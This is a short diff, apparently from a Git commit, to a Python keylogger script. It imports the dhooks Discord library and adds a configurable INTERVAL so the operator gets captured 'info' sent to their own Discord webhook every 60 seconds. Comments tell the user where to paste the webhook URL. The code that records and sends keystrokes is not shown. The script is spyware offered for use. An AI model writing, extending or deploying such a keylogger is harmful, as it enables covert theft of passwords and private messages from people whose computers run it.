@@ -3,7 +3,8 @@ import threading
 import dhooks
 
 
-WEBHOOK_URL = ""  # Put here your discord webhook url
+WEBHOOK_URL = ""  # Put here your discord webhook url.
+INTERVAL = 60  # You'll get the info every 60 seconds.
 
 
 class Keylogger:
@@ -43,4 +44,4 @@ class Keylogger:
 
 
 if __name__ == '__main__':
-    Keylogger(WEBHOOK_URL, 10)
+    Keylogger(WEBHOOK_URL, INTERVAL)
